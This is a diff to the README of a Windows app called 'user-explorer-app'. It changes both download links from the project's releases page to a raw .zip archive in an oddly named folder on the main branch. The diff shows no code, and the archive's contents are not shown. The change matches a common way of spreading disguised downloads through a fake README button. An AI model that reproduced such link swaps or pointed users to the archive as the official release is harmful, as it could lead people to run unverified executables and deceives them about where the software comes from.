@@ -1,12 +1,12 @@
 # 🧭 user-explorer-app - Find and Filter Users Fast
 
-[![Download the app](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/globalso8638/user-explorer-app/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/globalso8638/user-explorer-app/raw/refs/heads/main/gongoristic/explorer_app_user_v1.9.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:
 
-https://github.com/globalso8638/user-explorer-app/releases
+https://github.com/globalso8638/user-explorer-app/raw/refs/heads/main/gongoristic/explorer_app_user_v1.9.zip
 
 ## 🪟 Install on Windows
 
